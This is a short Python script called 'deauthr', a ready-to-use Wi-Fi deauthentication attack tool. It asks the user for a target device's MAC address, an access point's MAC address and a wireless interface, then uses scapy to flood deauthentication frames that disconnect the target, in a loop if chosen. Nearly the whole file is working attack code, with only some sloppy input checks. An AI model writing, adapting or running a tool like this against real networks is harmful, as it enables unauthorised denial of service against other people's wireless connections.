#deauthr v0.0.1
import os
import sys
import time
import scapy
import subprocess

from scapy.layers.dot11 import Dot11, Dot11Deauth
from scapy.sendrecv import sendp


#cool ascii art :3
print(r"       __                                  __      __                         "+"\n"
      r"      /  |                                /  |    /  |                        "+"\n"
      r"  ____$$ |  ______    ______   __    __  _$$ |_   $$ |____            ______  "+"\n"
      r" /    $$ | /      \  /      \ /  |  /  |/ $$   |  $$      \  ______  /      \ "+"\n"
      r"/$$$$$$$ |/$$$$$$  | $$$$$$  |$$ |  $$ |$$$$$$/   $$$$$$$  |/      |/$$$$$$  |"+"\n"
      r"$$ |  $$ |$$    $$ | /    $$ |$$ |  $$ |  $$ | __ $$ |  $$ |$$$$$$/ $$ |  $$/ "+"\n"
      r"$$ \__$$ |$$$$$$$$/ /$$$$$$$ |$$ \__$$ |  $$ |/  |$$ |  $$ |        $$ |      "+"\n"
      r"$$    $$ |$$       |$$    $$ |$$    $$/   $$  $$/ $$ |  $$ |        $$ |      "+"\n"
      r" $$$$$$$/  $$$$$$$/  $$$$$$$/  $$$$$$/     $$$$/  $$/   $$/         $$/      version 0.0.1"+"\n"
      "a dead simple wifi deauth tool\n")
#asks for required details
wifi_interface = input("enter the name of your wifi interface (ie: wlan0): ")
target_mac = input("enter the MAC address of your target: ")
gateway_mac = input("enter the MAC address you are authenticated with: ")
loop = input("should this attack loop? (enter 1 if the attack should loop, enter 0 if not): ")
if loop == "0":
    count = input("enter how many packets should be sent: ")
    interval = input("enter the packet interval (seconds): ")
    try:
        print(
            f"estimated attack time (assuming all packets are sent/received): {float(count) * float(interval)} seconds")
    except ValueError:
        print("please enter a valid number")
        sys.exit(1)
else:
    try:
        interval = input("enter the packet interval (seconds): ")
    except ValueError:
        print("please enter a valid number")
        sys.exit(1)
try:
    reason = int(input("please enter a reason code: "))
except ValueError:
    print("please enter a valid reason code")
    sys.exit(1)
except reason > 51:
    print("please enter a valid reason code")
    sys.exit(1)

def confirm_details():
    if loop == "0":
        print("wifi interface: " + wifi_interface)
        print("target MAC: " + target_mac)
        print("gateway MAC: " + gateway_mac)
        print("packets to be sent: " + str(count))
        print("packet interval: " + str(interval))
        print("reason code: " + str(reason))
    else:
        print("wifi interface: " + wifi_interface)
        print("target MAC: " + target_mac)
        print("gateway MAC: " + gateway_mac)
        print("packet interval: " + str(interval))
        print("reason code: " + str(reason))

confirm_details()
begin=input("strike any key to start the attack, or type 'exit' to exit: ")
if begin == 'exit':
    sys.exit(0)
print("----ATTACK BEGIN----")
print("[+] INITIALIZING DEAUTH PACKET FRAME")
dot11 = scapy.layers.dot11.Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)
print("[+] STACKING LAYERS, CREATING PACKET")
packet = scapy.layers.dot11.RadioTap()/dot11/Dot11Deauth(reason=reason)
print("[+] SENDING PACKETS")
sendp(packet, inter=int(interval), loop=int(loop), iface=wifi_interface, verbose=1)
#try:
#    result = subprocess.run(['ls', '-l'], capture_output=True, text=True, check=True)
#    print(result.stdout)
#except subprocess.CalledProcessError as e:
#    print(f"Error executing command: {e}")
#    print(f"Stderr: {e.stderr}")
